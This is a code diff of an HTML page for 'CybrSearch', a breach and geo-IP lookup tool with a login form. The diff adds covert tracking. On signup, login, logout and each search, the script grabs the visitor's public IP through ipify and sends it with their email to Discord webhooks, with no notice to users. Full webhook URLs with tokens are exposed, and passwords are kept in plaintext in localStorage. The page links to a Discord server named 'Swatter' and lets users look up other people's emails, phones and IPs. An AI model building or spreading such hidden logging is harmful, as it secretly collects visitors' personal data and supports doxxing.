@@ -2,87 +2,39 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>CybrSearch - Secure Tool</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CybrSearch - Breach + Geo IP Checker</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
   <style>
-    body {
-      background-color: #0d1117;
-      color: #c9d1d9;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      padding-top: 60px;
-    }
-    .container {
-      max-width: 700px;
-    }
-    .card {
-      background-color: #161b22;
-      border: none;
-      border-radius: 1rem;
-      box-shadow: 0 0 10px rgba(0,0,0,0.5);
-    }
-    .form-control {
-      background-color: #0d1117;
-      color: #c9d1d9;
-      border: 1px solid #30363d;
-    }
-    .form-control::placeholder {
-      color: #8b949e;
-    }
-    .btn-primary {
-      background-color: #238636;
-      border: none;
-    }
-    .result-box {
-      background-color: #1c2128;
-      border-left: 5px solid #30363d;
-      padding: 1rem;
-      border-radius: 0.5rem;
-      margin-top: 0.5rem;
-      white-space: pre-wrap;
-    }
+    body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding-top: 60px; }
+    .container { max-width: 700px; }
+    .card { background-color: #161b22; border: none; border-radius: 1rem; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+    .form-control { background-color: #0d1117; color: #c9d1d9; border: 1px solid #30363d; }
+    .form-control::placeholder { color: #8b949e; }
+    .btn-primary { background-color: #238636; border: none; }
+    .result-box { background-color: #1c2128; border-left: 5px solid #30363d; padding: 1rem; border-radius: 0.5rem; margin-top: 0.5rem; white-space: pre-wrap; }
     .result-box.success { border-left-color: #2ea043; }
     .result-box.warning { border-left-color: #d29922; }
     .result-box.error { border-left-color: #f85149; }
-    .discord-btn {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background-color: #5865F2;
-      color: white;
-      border: none;
-      border-radius: 30px;
-      padding: 10px 20px;
-      font-weight: bold;
-      text-decoration: none;
-    }
+    .discord-btn { position: fixed; top: 20px; right: 20px; background-color: #5865F2; color: white; border: none; border-radius: 30px; padding: 10px 20px; font-weight: bold; text-decoration: none; }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
   <a class="discord-btn" href="https://discord.gg/Swatter" target="_blank">Join Discord</a>
   <div class="container text-center">
-    <div id="authSection">
-      <h1 class="mb-4">🔐 Welcome to CybrSearch</h1>
-      <div id="loginForm" class="card p-4 mb-3">
-        <h4>Login</h4>
-        <input id="loginEmail" type="email" placeholder="Email" class="form-control mb-2" />
-        <input id="loginPass" type="password" placeholder="Password" class="form-control mb-2" />
-        <button onclick="login()" class="btn btn-primary w-100">Login</button>
-        <p class="mt-3">No account? <a href="#" onclick="toggleForms('signup')">Sign up here</a></p>
-      </div>
-
-      <div id="signupForm" class="card p-4 mb-3" style="display:none;">
-        <h4>Sign Up</h4>
-        <input id="signupEmail" type="email" placeholder="Email" class="form-control mb-2" />
-        <input id="signupPass" type="password" placeholder="Password" class="form-control mb-2" />
-        <button onclick="signup()" class="btn btn-success w-100">Sign Up</button>
-        <p class="mt-3">Already have an account? <a href="#" onclick="toggleForms('login')">Log in</a></p>
-      </div>
+    <div id="auth">
+      <h2 class="mb-3">🔐 Login / Signup</h2>
+      <form id="authForm" class="card p-4">
+        <input id="authEmail" type="email" placeholder="📧 Email" class="form-control mb-2" required>
+        <input id="authPassword" type="password" placeholder="🔑 Password" class="form-control mb-2" required>
+        <button type="submit" class="btn btn-primary w-100">Login / Signup</button>
+      </form>
     </div>
 
-    <div id="toolSection" style="display:none;">
+    <div id="mainApp" class="hidden">
       <h1 class="mb-4">🔍 Advanced Breach Checker + Geo IP</h1>
-      <button onclick="logout()" class="btn btn-danger mb-3 float-end">Logout</button>
+      <button onclick="logout()" class="btn btn-secondary mb-3">Logout</button>
       <form onsubmit="searchData(); return false;" class="card p-4">
         <input id="email" type="email" placeholder="📧 Enter email address" class="form-control mb-2">
         <input id="phone" type="text" placeholder="📱 Enter phone number" class="form-control mb-2">
@@ -99,73 +51,58 @@
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD";
+    const authWebhook = "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD";
+    const searchWebhook = "https://discord.com/api/webhooks/1380896839921958972/qvWggkKAnV6cMkE2MF3wq_2V5thvRRkP0r9iRsYIS31tqUBFJU1GQ3QsTJGN5L4ilRwr";
 
-    function sendWebhook(title, message) {
-      fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [{
-            title: title,
-            description: message,
-            color: 7506394,
-            timestamp: new Date().toISOString()
-          }]
-        })
-      }).catch(console.warn);
-    }
+    document.getElementById("authForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const email = document.getElementById("authEmail").value.trim();
+      const password = document.getElementById("authPassword").value.trim();
+      const stored = JSON.parse(localStorage.getItem("users") || "{}");
 
-    function toggleForms(show) {
-      document.getElementById('loginForm').style.display = show === 'login' ? 'block' : 'none';
-      document.getElementById('signupForm').style.display = show === 'signup' ? 'block' : 'none';
-    }
+      let visitorIP = "Unknown";
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        visitorIP = (await ipRes.json()).ip;
+      } catch {}
 
-    function signup() {
-      const email = document.getElementById("signupEmail").value.trim();
-      const password = document.getElementById("signupPass").value;
-      const users = JSON.parse(localStorage.getItem("users") || "{}");
-      if (users[email]) return alert("User already exists");
-      users[email] = { password };
-      localStorage.setItem("users", JSON.stringify(users));
-      sendWebhook("🆕 New Signup", `Email: ${email}`);
-      alert("Account created! Please login.");
-      toggleForms('login');
-    }
-
-    function login() {
-      const email = document.getElementById("loginEmail").value.trim();
-      const password = document.getElementById("loginPass").value;
-      const users = JSON.parse(localStorage.getItem("users") || "{}");
-      if (users[email]?.password === password) {
-        localStorage.setItem("authUser", email);
-        sendWebhook("🔐 Login", `User: ${email}`);
-        showTool();
+      if (!stored[email]) {
+        stored[email] = { password };
+        localStorage.setItem("users", JSON.stringify(stored));
+        await sendWebhook(authWebhook, "🆕 New Signup", email, visitorIP);
+      } else if (stored[email].password !== password) {
+        alert("Wrong password"); return;
       } else {
-        alert("Invalid credentials");
+        await sendWebhook(authWebhook, "✅ User Login", email, visitorIP);
       }
+
+      localStorage.setItem("loggedIn", email);
+      document.getElementById("auth").classList.add("hidden");
+      document.getElementById("mainApp").classList.remove("hidden");
+    });
+
+    async function logout() {
+      const email = localStorage.getItem("loggedIn");
+      await sendWebhook(authWebhook, "🚪 User Logout", email);
+      localStorage.removeItem("loggedIn");
+      location.reload();
     }
 
-    function logout() {
-      const email = localStorage.getItem("authUser");
-      sendWebhook("🔒 Logout", `User: ${email}`);
-      localStorage.removeItem("authUser");
-      showLogin();
-    }
-
-    function showTool() {
-      document.getElementById("authSection").style.display = "none";
-      document.getElementById("toolSection").style.display = "block";
-    }
-
-    function showLogin() {
-      document.getElementById("authSection").style.display = "block";
-      document.getElementById("toolSection").style.display = "none";
-    }
-
-    window.onload = () => {
-      if (localStorage.getItem("authUser")) showTool();
-      else showLogin();
+    async function sendWebhook(url, title, email, ip="") {
+      const payload = {
+        embeds: [{
+          title,
+          color: 3447003,
+          fields: [
+            { name: "📧 Email", value: email, inline: false },
+            { name: "🌐 IP Address", value: ip || "Unknown", inline: false },
+            { name: "🕒 Time", value: new Date().toUTCString(), inline: false }
+          ]
+        }]
+      };
+      try {
+        await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
+      } catch {}
     }
 
     function updateResult(type, msg, style) {
@@ -198,49 +135,32 @@
       let visitorIP = "Unknown";
       try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
-        const ipData = await ipRes.json();
-        visitorIP = ipData.ip || "Unknown";
+        visitorIP = (await ipRes.json()).ip;
       } catch {}
 
-      sendWebhook("🔍 Breach Search Attempt", `
-        Email: ${email || 'N/A'}
-        Phone: ${phone || 'N/A'}
-        Username: ${username || 'N/A'}
-        Discord: ${discord || 'N/A'}
-        User IP: ${ip || 'N/A'}
-        Visitor IP: ${visitorIP}
-      `);
+      await sendWebhook(searchWebhook, "🔍 Breach Search Attempt", email, visitorIP);
 
       if (ip) {
         try {
           const res = await fetch(`https://ipwho.is/${ip}`);
           const data = await res.json();
           if (data.success) {
-            updateResult("ipgeo", `🌐 IP Geo Info:\nIP: ${ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nISP: ${data.connection?.isp || 'N/A'}\nOrg: ${data.connection?.org || 'N/A'}`, "success");
+            updateResult("ipgeo", `🌐 IP Geo Info:\nIP: ${ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nISP: ${data.connection?.isp || 'N/A'}`, "success");
           } else {
             updateResult("ipgeo", `⚠️ Geo lookup failed: ${data.message}`, "warning");
           }
         } catch {
           updateResult("ipgeo", `❌ Error fetching Geo IP data.`, "error");
         }
-
-        try {
-          const rdapRes = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
-          const rdap = await rdapRes.json();
-          const handle = rdap.handle || 'N/A';
-          const network = rdap.name || 'N/A';
-          const startAddress = rdap.startAddress || 'N/A';
-          const endAddress = rdap.endAddress || 'N/A';
-          const orgName = rdap.entities?.[0]?.vcardArray?.[1]?.find(x => x[0] === 'fn')?.[3] || 'N/A';
-          const addressParts = rdap.entities?.[0]?.vcardArray?.[1]?.find(x => x[0] === 'adr')?.[3] || [];
-          const address = addressParts.filter(Boolean).join(', ') || 'N/A';
-
-          updateResult("arin", `🌐 ARIN Info:\nHandle: ${handle}\nNet Name: ${network}\nStart: ${startAddress}\nEnd: ${endAddress}\nOrg: ${orgName}\nAddress: ${address}`, "success");
-        } catch {
-          updateResult("arin", `❌ Error fetching ARIN RDAP data.`, "error");
-        }
       } else {
         updateResult("ip", "ℹ️ IP geo-location check skipped.", "warning");
+      }
+    }
+
+    window.onload = () => {
+      if (localStorage.getItem("loggedIn")) {
+        document.getElementById("auth").classList.add("hidden");
+        document.getElementById("mainApp").classList.remove("hidden");
       }
     }
   </script>
